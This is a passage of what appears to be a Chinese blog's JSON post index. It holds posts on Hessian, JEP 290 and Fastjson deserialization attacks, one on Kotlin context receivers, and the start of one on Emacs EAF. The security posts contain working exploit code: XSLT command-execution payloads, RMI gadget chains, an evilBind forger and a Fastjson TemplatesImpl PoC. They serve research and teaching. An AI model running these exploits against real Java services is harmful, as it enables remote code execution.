select=\u0026quot;rt:exec($rtobject,'ls')\u0026quot;/\u0026gt; \u0026lt;xsl:variable name=\u0026quot;processString\u0026quot; select=\u0026quot;ob:toString($process)\u0026quot;/\u0026gt; \u0026lt;xsl:value-of select=\u0026quot;$processString\u0026quot;/\u0026gt; \u0026lt;/xsl:template\u0026gt; \u0026lt;/xsl:stylesheet\u0026gt; Code Snippet 8: CVE-2024-36522 在进行反序列化黑名单绕过时（比如 NacOS），也常常通过 XSLT 绕过黑名单实现任意类加载（因为特征在字符串中，可以搭配各种编码混淆），从而写入内存马\n\u0026lt;xsl:stylesheet version=\u0026quot;1.0\u0026quot; xmlns:xsl=\u0026quot;http://www.w3.org/1999/XSL/Transform\u0026quot; xmlns:b64=\u0026quot;http://xml.apache.org/xalan/java/sun.misc.BASE64Decoder\u0026quot; xmlns:ob=\u0026quot;http://xml.apache.org/xalan/java/java.lang.Object\u0026quot; xmlns:th=\u0026quot;http://xml.apache.org/xalan/java/java.lang.Thread\u0026quot; xmlns:ru=\u0026quot;http://xml.apache.org/xalan/java/org.springframework.cglib.core.ReflectUtils\u0026quot;\u0026gt; \u0026lt;xsl:template match=\u0026quot;/\u0026quot;\u0026gt; \u0026lt;xsl:variable name=\u0026quot;bs\u0026quot; select=\u0026quot;b64:decodeBuffer(b64:new(),'\u0026lt;class_bytes_b64\u0026gt;')\u0026quot;/\u0026gt; \u0026lt;xsl:variable name=\u0026quot;cl\u0026quot; select=\u0026quot;th:getContextClassLoader(th:currentThread())\u0026quot;/\u0026gt; \u0026lt;xsl:variable name=\u0026quot;rce\u0026quot; select=\u0026quot;ru:defineClass('\u0026lt;class_name\u0026gt;',$bs,$cl)\u0026quot;/\u0026gt; \u0026lt;xsl:value-of select=\u0026quot;$rce\u0026quot;/\u0026gt; \u0026lt;/xsl:template\u0026gt; \u0026lt;/xsl:stylesheet\u0026gt; 结合 SwingLazyValue#createValue 的反射调用利用点，可以使用 com.sun.org.apache.xalan.internal.xslt.Process#_main 加载执行恶意 XSLT 代码，但是需要通过文件路径来加载，所以需要先写到文件中\n将恶意 XSLT 代码写入文件 String evilXslt = \u0026quot;\u0026lt;恶意XSLT代码，比如上文的命令执行\u0026gt;\u0026quot;; SwingLazyValue value1 = new SwingLazyValue(\u0026quot;com.sun.org.apache.xml.internal.security.utils.JavaUtils\u0026quot;, \u0026quot;writeBytesToFilename\u0026quot;, new Object[]{\u0026quot;/tmp/xslt_data\u0026quot;, evilXslt.getBytes()}); 加载解析 XSLT，触发命令执行 SwingLazyValue value2 = new SwingLazyValue(\u0026quot;com.sun.org.apache.xalan.internal.xslt.Process\u0026quot;, \u0026quot;_main\u0026quot;, new Object[]{new String[]{\u0026quot;-XT\u0026quot;, \u0026quot;-XSL\u0026quot;, \u0026quot;file:///tmp/xslt_data\u0026quot;}}); References https://su18.org/post/hessian/ https://yzddmr6.com/posts/swinglazyvalue-in-webshell/ ","date":"2024-12-18","permalink":"https://zrquan.github.io/posts/hessian-deserialization/","tags":["java","deserialize","hessian"],"title":"Hessian Deserialization"},{"content":" Status: Experimental in 1.6.20-M1 Discussion: KEEP-259 介绍 Kotlin 在 1.6.20-M1 版本中添加了一个实验性的新特性 context receivers，以支持上下文相关的声明（context-dependent declarations）\n这个特性是为了方便在 Kotlin 中面向上下文编程，而在此之前主要通过扩展函数和作用域函数实现。关于面向上下文编程可以看看这篇文章\n引入 context receivers 的目的1：\nRemove all limitations of member extensions for writing contextual abstractions Support top-level (non-member) contextual functions and properties Support adding contextual function and properties to 3rd party context classes Support multiple contexts Make blocks of code with multiple receivers representable in Kotlin\u0026rsquo;s type system Separate the concepts of extension and dispatch receivers from the concept of context receivers Context receivers should not change the meaning of unqualified this expression Multiple contexts should not be ordered during resolution, resolution ambiguities shall be reported Design a scalable resolution algorithm with respect to the number of receivers Call resolution should not be exponential in the number of context receivers 另外需要注意，context receivers 在 1.6.20 版本中还是实验性的，需要显式开启 -Xcontext-receivers 才能使用。比如在 Gradle 中使用：\ntasks.withType\u0026lt;KotlinCompile\u0026gt; { kotlinOptions.jvmTarget = \u0026quot;17\u0026quot; kotlinOptions.freeCompilerArgs += \u0026quot;-Xcontext-receivers\u0026quot; } 使用场景 举个例子，我们来实现一个简单的银行交易逻辑，其中存款和取款必须是事务性的，在失败时进行回滚\n我们在 AccountService#transfer 中处理交易逻辑，通过 Transaction 进行事务性操作，所以 transfer 需要传入一个事务实例。常规实现：\nclass AccountService { fun transfer(tx: Transaction, vararg operations: () -\u0026gt; Unit) { tx.start() try { operations.forEach { it.invoke() } tx.commit() } catch (e: Exception) { tx.rollback() } } } 然后在调用时将 Transaction 实例和 lambda 作为参数传入：\nval service = AccountService() val transaction = Transaction() val repo = AccountRepo() service.transfer( transaction, { repo.credit(account1, 10.5) }, { repo.debit(account2, 10.5) } ) 上面的实现在 Java 中很常见，但是在 Kotlin 我们可以用扩展函数来优化一下：\nclass AccountService { fun Transaction.transfer(vararg operations: () -\u0026gt; Unit) { start() try { operations.forEach { it.invoke() } commit() } catch (e: Exception) { rollback() } } } 现在 transfer 中的 this 指向了 Transaction 实例，那么就不再需要通过参数传入了，不过需要在 AccountService 实例的上下文中使用 transfer，比如使用 with：\nwith(service) { transaction.transfer( { repo.credit(account1, 10.5) }, { repo.debit(account2, 10.5) } ) } 使用扩展函数虽然减少了一些代码，但是存在其他问题：在语义上和原来的版本是不同的——transfer 是 Transaction 类的方法，这一点也不符合实际的逻辑，Transaction 应该只包含事务性的操作\n那么有没有办法将 Transaction 上下文引入 transfer 的同时，不改变 transfer 的所属类呢？Context receivers 特性就可以实现这一点\n我们在 transfer 的声明上通过 context() 指定上下文，那么在函数内就会引入一个指向 Transaction 的隐式的 this\nclass AccountService { context(Transaction) fun transfer(vararg operations: () -\u0026gt; Unit) { start() try { operations.forEach { it.invoke() } commit() } catch (e: Exception) { rollback() } } } 然后在 Transaction 实例的上下文中调用 transfer 服务，在语义上也符合逻辑\nwith(transaction) { service.transfer( { repo.credit(account1, 10.5) }, { repo.debit(account2, 10.5) } ) } 思考 由于 context receivers 还处于实验阶段，使用体验和实际案例都还比较欠缺，要感受到它带来的好处恐怕还需要一段时间。不过在实现 DSL 上它肯定比继承更加适合，唯一需要担心的是滥用 context 导致代码晦涩难懂\n关于 context receivers 的详细说明建议看 KEEP 上的相关提案：context-receivers\nhttps://github.com/Kotlin/KEEP/blob/master/proposals/context-receivers.md#goals\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"2022-06-06","permalink":"https://zrquan.github.io/posts/context-receivers/","tags":["kotlin"],"title":"Context receivers"},{"content":"本文主要介绍一下 JEP 290 这个特性，分析它是如何保护 RMI 免受反序列化攻击的，以及有哪些方法可以绕过 JEP 290 对 RMI 进行反序列化攻击。\n在之前的文章《Java RMI》中介绍了 RMI 机制可能遭受反序列化漏洞攻击的几种情况，但那是在没有 JEP 290 机制的前提下进行的。JEP 290 是在 Java9 中新增的安全特性，为反序列化流程提供了检验和过滤机制，并且该特性向前移植到了 JDK 6/7/8 中。\nJEP 290 简介 JEP 290 的核心过程就是序列化客户端通过实现 ObjectInputFilter 接口来创建一个过滤器，并调用 setObjectInputFilter 方法将它设置到 ObjectInputStream 中。这个过滤器会在反序列化过程中被调用，对即将反序列化的类进行检验和过滤，然后返回 ACCEPTED、REJECTED 或者 UNDECIDED 这几个状态1。\nJEP 290 主要的特点如下：\n提供灵活的机制，让开发者可以通过黑白名单限制要反序列化的类； 反序列化时可以设置指标来限制反序列化的深度和复杂度； 为 RMI 远程对象提供类验证机制； 过滤器不能修改或继承 ObjectInputStream 的现存子类； 定义一个可以通过 properties 或者文件来配置的全局过滤器。 检验过程分析 之前的文章中我们分析过，注册中心调用 bind 方法注册远程对象时，会对服务端传来的对象进行反序列化，如果这是一个恶意对象就可能导致命令执行。那么在 JEP 290 机制的保护下结果是怎样呢？\n我们使用 JDK 8u212 测试一下，Server 端返回以下错误：\n在 ObjectInputStream#filterCheck 方法中对反序列化类进行了检验，返回的状态是 REJECTED 导致抛出异常。从 Registry 的输出可以看到被过滤的类是 AnnotationInvocationHandler：\n根据错误信息给出的调用栈，我们跟进一下重要的方法。首先来到注册远程对象的逻辑代码中，bind 方法对应的操作码是 0，进入 case 0 语句块，先后反序列化远程对象的名称和实现了 Remote 接口的远程对象：\n跟进 readObject 过程，这时要反序列化的是我们传过来的恶意对象，所以进入到 ObjectInputStream#readOrdinaryObject 方法，并调用 readClassDesc 来获取类描述符。\n根据是否为动态代理类会调用不同的方法进行处理，而我们发送的恶意对象是一个动态代理类，它的 InvocationHandler 属性是被过滤掉的 AnnotationInvocationHandler。因此调用 readProxyDesc：\n在 readProxyDesc 中会对 interfaces 属性中的接口依次进行检验：\n此时动态代理类的接口列表只有一个 Remote 类，通过了检验。然后再调用一次 filterCheck 来检验代理类本身：\ncom.sun.proxy.$Proxy 是由 Proxy#newProxyInstance 方法在运行时生成的对象，并没有对应的源代码。\n然后增加递归深度 depth 和引用总数 totalObjectRefs，递归调用 readClassDesc 方法获取类描述符：\n这次进入的是 readNonProxyDesc 方法，继续调用 filterCheck 检验当前类，然后递归执行：\n这里注意区分 java.lang.reflect.Proxy 和上面的 com.sun.proxy.$Proxy ，后者通过前者的 newProxyInstance 方法生成。\n获取了最外层的动态代理类的描述符之后，回到 ObjectInputStream#readOrdinaryObject 方法中，然后对属性对象进行反序列化。过程和之前类似，在 readNonProxyDesc 方法中调用 filterCheck 检验 AnnotationInvocationHandler 类。这次我们跟进分析一下 filterCheck 方法：\n可以看到调用了 serialFilter.checkInput 来进行检验，从 RegistryImpl 类中找到实现检验逻辑的 registryFilter 方法：\nprivate static Status registryFilter(FilterInfo var0) { ... if (var0.depth() \u0026gt; 20L) { return Status.REJECTED; } else { Class var2 = var0.serialClass(); if (var2 != null) { if (!var2.isArray()) { return String.class != var2 \u0026amp;\u0026amp; !Number.class.isAssignableFrom(var2) \u0026amp;\u0026amp; !Remote.class.isAssignableFrom(var2) \u0026amp;\u0026amp; !Proxy.class.isAssignableFrom(var2) \u0026amp;\u0026amp; !UnicastRef.class.isAssignableFrom(var2) \u0026amp;\u0026amp; !RMIClientSocketFactory.class.isAssignableFrom(var2) \u0026amp;\u0026amp; !RMIServerSocketFactory.class.isAssignableFrom(var2) \u0026amp;\u0026amp; !ActivationID.class.isAssignableFrom(var2) \u0026amp;\u0026amp; !UID.class.isAssignableFrom(var2) ? Status.REJECTED : Status.ALLOWED; } else { return var0.arrayLength() \u0026gt;= 0L \u0026amp;\u0026amp; var0.arrayLength() \u0026gt; 1000000L ? Status.REJECTED : Status.UNDECIDED; } } else { return Status.UNDECIDED; } } } 除了限制了反序列化的深度以外，还设置了一个白名单，要求目标类继承于白名单的类，显然 AnnotationInvocationHandler 类并不符合要求。\n这个 serialFilter 过滤器是在 UnicastServerRef#unmarshalCustomCallData 方法中设置的：\nprotected void unmarshalCustomCallData(ObjectInput var1) throws IOException, ClassNotFoundException { if (this.filter != null \u0026amp;\u0026amp; var1 instanceof ObjectInputStream) { final ObjectInputStream var2 = (ObjectInputStream)var1; AccessController.doPrivileged(new PrivilegedAction\u0026lt;Void\u0026gt;() { public Void run() { Config.setObjectInputFilter(var2, UnicastServerRef.this.filter); return null; } }); } } 通过以上分析过程，注意到 JEP 290 在 RMI 中有两个关键点——一是要通过 Config.setObjectInputFilter 设置过滤器；二是过滤器中设置了白名单。那么想要绕过 JEP 290 自然会有两个思路，找到一个序列化流，它在反序列化传入的对象前没有设置过滤器，或者利用符合白名单条件的类进行攻击。\n未设置过滤器 调用注册中心的 bind、 rebind 、lookup 等方法都会经过 UnicastServerRef#oldDispatch，设置 serialFilter 进行白名单检测。但是除此之外，反序列化过程也存在于远程方法的调用时，方法的参数和返回值分别在 Server 端和 Client 端进行反序列化，如果它们是 Object 类，我们可以传递一个恶意对象完成攻击。\n在远程对象中声明一个方法 attackServer，接收 Object 对象作为参数，Client 端调用 attackServer 并传入 cc5 构造的恶意对象。\n// CommonsCollections5 Transformer[] transformers = new Transformer[] {...}; Transformer transformerChain = new ChainedTransformer(transformers); final Map innerMap = new HashMap(); final Map lazyMap = LazyMap.decorate(innerMap, transformerChain); TiedMapEntry entry = new TiedMapEntry(lazyMap, \u0026quot;foo\u0026quot;); BadAttributeValueExpException evilObj = new BadAttributeValueExpException(null); Field valfield = evilObj.getClass().getDeclaredField(\u0026quot;val\u0026quot;); valfield.setAccessible(true); valfield.set(evilObj, entry); Registry reigstry = LocateRegistry.getRegistry(3333); User user = (User) reigstry.lookup(\u0026quot;User\u0026quot;); user.attackServer(evilObj); 通过参数传递的恶意对象成功反序列化并执行命令，再尝试远程方法中 return 一个恶意对象来攻击 Client 端，同样成功执行命令，显然 JEP 290 在此时没有起到作用。在 filterCheck 方法下个断点，当检验 BadAttributeValueExpException 类时，serialFilter 为 null：\n从调用栈可以发现 UnicastServerRef 对象在处理 Client 请求反序列化参数前，也执行了 unmarshalCustomCallData 方法，不过 filter 属性为 null，没有设置任何过滤器：\n虽然通过远程对象的方法进行反序列化攻击没有受到 JEP 290 的影响，但是现实中这些方法不太可能直接接收一个 Object 对象作为参数或者返回值，而通常是其派生类或者一些基本类型。\n好在客户端的代码是完全可控的，虽然直接调用方法传递非法对象会引起异常，但是完全可以在方法执行后，序列化数据发送前进行修改。比如，像《Java RMI》中攻击 lookup 过程一样伪造客户端的请求流程，或者通过 Javassist、ASM 等包直接修改字节码等等。\n本来打算在本文介绍通过 RASP 在运行时修改目标参数(hook)的形式实现反序列化攻击，但考虑到篇幅问题，而且 RASP 的实现也涉及 Java Agent、 JVMTI 、Instrumentation 等一些重要的知识点，所以决定完整学习后再分享文章。具体实现可以参考：RemoteObjectInvocationHandler\nUnicastRef 在 JDK 8u231 之前，可以利用 UnicastRef 这个白名单中的类绕过 JEP 290。先让注册中心反序列化该类，它可以发起一个 JRMP 连接到恶意服务端上，从而在 DGC(Distributed Garbage Collection) 层反序列化服务端返回的对象，因为 DGC 层的 filter 是在反序列化之后进行设置的，没有起到实际作用2。\n示例代码：\nObjID id = new ObjID(new Random().nextInt()); TCPEndpoint te = new TCPEndpoint(\u0026quot;127.0.0.1\u0026quot;, 12333); // JRMPListener's port is 12333 UnicastRef ref = new UnicastRef(new LiveRef(id, te, false)); RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref); registry.bind(\u0026quot;User\u0026quot;, obj); 构造一个 RemoteObjectInvocationHandler 发送给注册中心，它的 ref 属性里面保存了 JRMPListener 的端口信息，示例代码中的几个类都在 RMI 白名单中。注册中心进行 bind 时会调用其父类 Remote 的 readObject 方法进行反序列化，并通过 UnicastRef#readExternal 封装我们写入的 IP 和端口信息。此时的调用栈如下：\nread:315, LiveRef (sun.rmi.transport) readExternal:489, UnicastRef (sun.rmi.server) readObject:455, RemoteObject (java.rmi.server) ... readObject0:1573, ObjectInputStream (java.io) readObject:431, ObjectInputStream (java.io) dispatch:92, RegistryImpl_Skel (sun.rmi.registry) ... 跟进 LiveRef#read 方法：\n这里将端口信息保存到 LiveRef 对象中，这些信息会在后面发送 JRMP 请求时用到。然后返回 RegistryImpl_Skel#dispatch 流程，执行 releaseInputStream 方法。一直跟进到以下代码，执行 DGCClient#registerRefs 并且参数包含恶意服务端的端口信息：\n执行到 DGCImpl_Stub#dirty：\n可以看到在 ref 属性中包含服务端的端口信息，通过 newCall 建立 JRMP 连接，writeObject 写入要发送的数据，然后调用 invoke 方法处理(发送)请求。在 StreamRemoteCall#executeCall 方法中获取连接的输入流，并执行 readObject 反序列化从输入流获取的对象：\n此时的调用栈如下：\nexecuteCall:252, StreamRemoteCall (sun.rmi.transport) invoke:375, UnicastRef (sun.rmi.server) dirty:109, DGCImpl_Stub (sun.rmi.transport) makeDirtyCall:382, DGCClient$EndpointEntry (sun.rmi.transport) registerRefs:324, DGCClient$EndpointEntry (sun.rmi.transport) registerRefs:160, DGCClient (sun.rmi.transport) registerRefs:102, ConnectionInputStream (sun.rmi.transport) releaseInputStream:157, StreamRemoteCall (sun.rmi.transport) dispatch:96, RegistryImpl_Skel (sun.rmi.registry) ... 跟进这个流的反序列化过程，就能看到在执行 filterCheck 方法检查恶意类 BadAttributeValueExpException 时，还没有设置过滤器。\n因此恶意对象被成功反序列化，导致命令执行。\nfix 这条利用链在 JDK 8u231 进行了修复，在 DGCImpl_Stub#dirty 中先设置了输入流的过滤器，导致恶意类无法通过检测。\nUnicastRemoteObject 国外安全研究人员 @An Trinhs 发现了一条利用链，利用 UnicastRemoteObject 类可以进行反序列化攻击，而且在 JDK 8u231 依然有效。示例代码：\nRegistry registry = LocateRegistry.getRegistry(3333); ObjID id = new ObjID(new Random().nextInt()); TCPEndpoint te = new TCPEndpoint(\u0026quot;127.0.0.1\u0026quot;, 12333); // JRMPListener's port is 3333 UnicastRef ref = new UnicastRef(new LiveRef(id, te, false)); RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref); // jdk8u231 RMIServerSocketFactory rmiServerSocketFactory = (RMIServerSocketFactory) Proxy.newProxyInstance( RMIServerSocketFactory.class.getClassLoader(), new Class[] {RMIServerSocketFactory.class, Remote.class}, obj); Constructor\u0026lt;?\u0026gt; constructor = UnicastRemoteObject.class.getDeclaredConstructor(null); constructor.setAccessible(true); UnicastRemoteObject clz = (UnicastRemoteObject) constructor.newInstance(null); Field ssf = UnicastRemoteObject.class.getDeclaredField(\u0026quot;ssf\u0026quot;); ssf.setAccessible(true); ssf.set(clz, rmiServerSocketFactory); evilBind(registry, \u0026quot;User\u0026quot;, clz); 最后一行的 evilBind 方法是为了修改某个参数而伪造 bind 的请求逻辑，代码会在后面给出。\n那么我们先分析一下 UnicastRemoteObject 的反序列化过程，它重写的 readObject 方法如下：\nprivate void readObject(java.io.ObjectInputStream in) throws Exception { in.defaultReadObject(); reexport(); } 首先对输入流进行反序列化，完成当前对象属性的赋值，然后执行 reexport 方法。跟进该方法，当属性 ssf 不为 null 时，将它作为参数之一调用 exportObject 导出远程对象：\n跟进到 TCPEndpoint#listen，生成了一个 var1 变量并调用其 newServerSocket 方法，而这个 var1 实则是我们构造的动态代理对象。\n此时的调用栈如下：\nlisten:335, TCPTransport (sun.rmi.transport.tcp) exportObject:254, TCPTransport (sun.rmi.transport.tcp) exportObject:411, TCPEndpoint (sun.rmi.transport.tcp) exportObject:147, LiveRef (sun.rmi.transport) exportObject:237, UnicastServerRef (sun.rmi.server) exportObject:383, UnicastRemoteObject (java.rmi.server) exportObject:346, UnicastRemoteObject (java.rmi.server) reexport:268, UnicastRemoteObject (java.rmi.server) readObject:235, UnicastRemoteObject (java.rmi.server) ... 动态代理对象的处理类 RemoteObjectInvocationHandler，因此会执行到它的 invoke 方法中，如果代理的目标对象不是 Object 类，则调用 invokeRemoteMethod 来执行远程方法：\n继续跟进 invokeRemoteMethod，要求当前的动态代理类实现 Remote 接口，然后执行 UnicastRef#invoke 和服务端(JRMPListener)进行连接，调用远程方法：\n在 StreamRemoteCall#executeCall 中读取服务端返回的“状态码”，如果返回 1 则发生异常，如果返回 2 则顺利返回结果，在客户端(注册中心)对结果反序列化：\n输入流 this.in 还没有设置过滤器，serialFilter 属性为空，因此恶意对象顺利反序列化导致代码执行。\n最后再说回示例代码，我们注册对象时调用的并不是 RegistryImpl_Stub#bind，而是自己构造的 evilBind 方法。要了解原因就要分析一下正常的 bind 方法的执行流程，它在执行输出流的 writeObject 时，进行了以下判断：\n可以看到有一个值为 true 的 enableReplace 属性，导致调用 replaceObject 方法来替换我们传入的对象。\nprotected final Object replaceObject(Object var1) throws IOException { if (var1 instanceof Remote \u0026amp;\u0026amp; !(var1 instanceof RemoteStub)) { Target var2 = ObjectTable.getTarget((Remote)var1); if (var2 != null) { return var2.getStub(); } } return var1; } 如果对象实现了 Remote 接口就会被替换掉，而这个利用链又要求该动态代理类实现 Remote 接口才能顺利进行，所以我们模仿 RegistryImpl_Stub#bind 的逻辑写一个新方法，在里面将 enableReplace 设置为 false。\nevilBind public static void evilBind(Registry reg, String var1, Remote var2) throws Exception { // 获取super.ref Field[] fields_0 = reg.getClass().getSuperclass().getSuperclass().getDeclaredFields(); fields_0[0].setAccessible(true); UnicastRef ref = (UnicastRef) fields_0[0].get(reg); // 获取operations Field[] fields_1 = reg.getClass().getDeclaredFields(); fields_1[0].setAccessible(true); Operation[] operations = (Operation[]) fields_1[0].get(reg); StreamRemoteCall var3 = (StreamRemoteCall) ref.newCall((RemoteObject) reg, operations, 0, 4905912898345647071L); try { ObjectOutput var4 = var3.getOutputStream(); // 将enableReplace 设为 false Field er = var4.getClass().getSuperclass().getSuperclass().getDeclaredField(\u0026quot;enableReplace\u0026quot;); er.setAccessible(true); er.set(var4, false); var4.writeObject(var1); var4.writeObject(var2); } catch (IOException var5) { throw new MarshalException(\u0026quot;error marshalling arguments\u0026quot;, var5); } ref.invoke(var3); ref.done(var3); } fix 在 JDK 8u241 中对这条利用链进行了修复，调用 UnicastRef#invoke 前先对动态代理的目标类进行判断，如果没有实现 Remote 接口就抛出异常。而 RMIServerSocketFactory 并不符合要求：\n总结 JEP 290 的核心就是允许开发者通过实现 ObjectInputFilter 接口给输入流定义过滤器，再调用 ObjectInputStream#setInternalObjectInputFilter 为输入流设置对应的过滤器，只有符合条件的对象才能通过检测然后被反序列化。\n远程对象的方法参数和返回值在进行反序列化时没有设置输入流的过滤器，只要想办法发送恶意对象就能成功反序列化。\n如果要攻击注册中心， JDK 8u231 以下的版本可以利用 UnicastRef 和 UnicastRemoteObject 类绕过 JEP 290，而在 JDK 8u231 版本只能使用后者。\nhttps://openjdk.java.net/jeps/290\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://cert.360.cn/report/detail?id=add23f0eafd94923a1fa116a76dee0a1\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"2021-04-20","permalink":"https://zrquan.github.io/posts/jep290/","tags":["java","deserialize"],"title":"Bypass JEP 290"},{"content":"Fastjson 是 alibaba 的一款开源 JSON 解析库，可以将 Java 对象和 JSON 字符串相互转化，并提供了 autotype 机制让使用者可以解析任意 Java 对象，导致一些存在利用点的类被用来进行反序列化攻击。\nTemplatesImpl 利用链 这个类存在利用点的方法是 getTransletInstance，关键的代码如下：\nif (_name == null) return null; if (_class == null) defineTransletClasses(); // The translet needs to keep a reference to all its auxiliary // class to prevent the GC from collecting them AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance(); ... 首先是 _name 变量不能为空，不然直接返回 null。\n这里的 _class 数组用来保存辅助类，避免垃圾收集器将它们销毁，并通过 newInstance 方法将主类初始化赋值给 translet 变量。前面判断当 _class 数组为空时会执行 defineTransletClasses 方法，我们跟进分析一下。\n这个方法主要是将 _bytecodes 的字节码提取出来，并调用 loader.defineClass 方法生成各个辅助类的 Class 对象保存到 _class 数组中。注意上图的两个红框部分——在创建 loader 时需要调用 _tfactory 私有变量中的方法，如果变量是空的话会报错，所以构造 poc 时需要随便设一个初始值；为了将当前的类设为主类使它初始化，需要这个类继承 AbstractTranslet 类。\n综上我们可以构造一个 AbstractTranslet 的子类保存到 _bytecodes 中，在它的构造方法写入命令，当这个恶意类被初始化时命令就会执行。\npublic class EvilObject extends AbstractTranslet { public EvilObject() throws IOException { Runtime.getRuntime().exec(\u0026quot;calc.exe\u0026quot;); } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {} @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {} } 为了调用 getTransletInstance 方法，我们需要从 getOutputProperties 方法进入，它是私有变量 _outputProperties 的 getter 方法，会在 Fastjson 反序列化的过程中执行。调用栈如下：\nFastjson 解析过程 通过下面的示例代码，构造恶意 TemplatesImpl 类的 JSON 字符串，调用 JSON#parse 方法进行反序列化：\npublic class TemplatesImplPoc { public static String getBytecodes(String classPath) throws IOException { ByteArrayOutputStream out = new ByteArrayOutputStream(); Files.copy(Paths.get(classPath), out); return Base64.getEncoder().encodeToString(out.toByteArray()); } public static void main(String[] args) throws Exception { final String evilClassPath = System.getProperty(\u0026quot;user.dir\u0026quot;) + \u0026quot;\\\\target\\\\classes\\\\EvilObject.class\u0026quot;; String evilCode = getBytecodes(evilClassPath); final String NASTY_CLASS = \u0026quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\u0026quot;; String poc = \u0026quot;{\\\u0026quot;@type\\\u0026quot;:\\\u0026quot;\u0026quot; + NASTY_CLASS + \u0026quot;\\\u0026quot;,\\\u0026quot;_bytecodes\\\u0026quot;:[\\\u0026quot;\u0026quot; + evilCode + \u0026quot;\\\u0026quot;],'_name':'a.b','_tfactory':{},\\\u0026quot;_outputProperties\\\u0026quot;:{}}\u0026quot;; JSON.parse(poc, Feature.SupportNonPublicField); } } 首先编译恶意类得到 class 文件，读取文件内容并且 base64 编码后写到 _bytecodes 数组中， @type 指定反序列化 json 字符串的目标类型。然后初始化了一些属性，这些属性的作用在前面有解释，由于要设置私有属性，反序列化时需要开启 SupportNonPublicField 选项才能利用成功。\n一直跟进到 DefaultJSONParser#parseObject 方法，创建 DefaultJSONParser 对象时初始化了 ParserConfig、JSONScanner 等重要类的实例。\nFastjson 1.2.24 还没有引入 checkAutotype 安全机制，黑名单中只要两个线程类。\n识别到 @type 关键字后，会从值中读取类名并获取 Class 对象，然后调用 ParserConfig#getDeserializer 方法获取解析器。\n在 getDeserializer 方法中对类名进行一些检查，看看是否在 denyList 中，或者是不是一些特殊的类。\n如果一直找不到解析器，就会执行 createJavaBeanDeserializer 方法创建。跟进到 JavaBeanInfo#build 方法：\n通过反射获取 TemplatesImpl 类的公共属性、方法和构造器，然后遍历公共方法将 setter 和对应的属性信息添加到 fieldList 中。\n在方法最后又对 methods 进行了一次遍历，这次将关键的 getOutputProperties 方法添加到 fieldList 中。\n可以看到方法需要满足一些条件，首先是 if 语句中条件：\n// 1.方法名长度大于4 methodName.length() \u0026gt;= 4 \u0026amp;\u0026amp; // 2.不能是静态方法 !Modifier.isStatic(method.getModifiers()) \u0026amp;\u0026amp; // 3.以get开头 methodName.startsWith(\u0026quot;get\u0026quot;) \u0026amp;\u0026amp; // 4.第四个字符是大写 Character.isUpperCase(methodName.charAt(3)) \u0026amp;\u0026amp; // 5.不能有参数 method.getParameterTypes().length == 0 \u0026amp;\u0026amp; // 6.返回值继承于Collection||Map||AtomicBoolean||AtomicInteger||AtomicLong (Collection.class.isAssignableFrom(method.getReturnType()) || Map.class.isAssignableFrom(method.getReturnType()) || AtomicBoolean.class == method.getReturnType() || AtomicInteger.class == method.getReturnType() || AtomicLong.class == method.getReturnType()) 然后是属性不能在 fieldList 中，也就是刚刚添加 setter 时没有该属性的 setter。\n最后返回解析器并执行它的 deserialze 方法，解析器的 sortedFieldDeserializers 属性封装了 getOutputProperties 方法。\n依次处理完 bytecodes、name 和 tfactory 三个属性后开始处理 outputProperties，我们跟进到 JavaBeanDeserializer#parseField 方法，该方法获取属性的解析器对其进行处理。\n从上图看到通过 smartMatch 方法获取 outputProperties 属性的解析器，但是参数前面是带有下划线的(之前三个属性也是)。不过 smartMatch 方法会将参数中的 - 和 _ 忽略：\n然后跟进到 FieldDeserializer#setValue 方法，在为参数(outputProperties)赋值时从 fieldInfo 获取对应的 method 并调用 invoke 方法执行。\n就这样 Fastjson 的反序列化过程和 TemplatesImpl 的利用链成功适配，导致命令执行。\n我们再回过头看看 bytecodes 参数的解析过程，Fastjson 根据属性的类型(字节数组)获取对应的解析器 ObjectArrayCodec，读取其内容时调用 JSONScanner#bytesValue 方法进行 base64 解码：\npublic byte[] bytesValue() { return IOUtils.decodeBase64(this.text, this.np + 1, this.sp); } 所以 poc 中 bytecodes 的值要进行编码处理。\n总结 Fastjson 1.2.24 中 autotype 是默认开启的，而且没有 checkAutotype 方法，所以攻击难度相对较低，在 1.2.25 后基本是针对 checkAutotype 的各种绕过了。但 TemplatesImpl 利用链中需要设置一些私有属性，需要 Fastjson 开启 SupportNonPublicField 选项，而这个选项是在 1.2.22 版本引入的。\nFastjson 还提供了几个 parseObject 方法来解析 JSON 字符串，不过最后和本文的示例一样都会执行到 DefaultJSONParser#parse，不影响 TemplatesImpl 利用链。\nFastjson 解析 JSON 字符串时，会调用反序列化对象的公共 setter 和构造函数，还有符合一定条件的 getter，TemplatesImpl 利用链就是用到了 getter 方法中的漏洞。\n","date":"2021-04-12","permalink":"https://zrquan.github.io/posts/fastjson/","tags":["fastjson","java"],"title":"Fastjson 1.2.24 TemplatesImpl利用链"},{"content":"What EAF 是 ManateeLazyCat 开发的 Emacs 图形应用框架，通过 PyQt 框架来开发图形应用并将其固定在 Emacs 窗口的合适位置，Emacs 和 Python 进程则通过 IPC 进行通信，达到像操作 Emacs 原生 buffer 和 window 一样操作图形应用的效果。\nEAF 使用 QGraphicsScene 和 QGraphicsView 来模拟 Emacs 中的 buffer 和 window， QGraphicsScene 管理应用的内容、处理键鼠事件，生命周期和 buffer 相同；QGraphicsView 展示图形界面、监听鼠标事件，生命周期和 window 相同，再通过 QWindow::setParent 技术将它固定在 Emacs 上。而键盘事件则由 Emacs 接收，通过 EPC 发送给 QGraphicsScene。1\nHomepage: https://github.com/manateelazycat/emacs-application-framework\nWhy 不记得之前在哪里看到一句话——Emacs 最大的缺点就是你不得不离开 Emacs。\n之前写文章做笔记时，都要一个半屏打开浏览器或者 PDF，一个半屏放 Emacs。现在可以直接在 Emacs 打开浏览器，用来预览本地博客真的很爽。\n当然，EAF 的应用比起那些成熟的软件还是有很大差距的，功能也比较简单，不必非要用它来取代其他软件。我个人对 Live in Emacs 是没啥执念的，哪个用着爽就用哪个😁\nHow EAF 的安装很简单(只要不遇到奇奇怪怪的 bug)，github 主页给了详细的过程，下面我写一下我在 Windows10 \u0026amp; 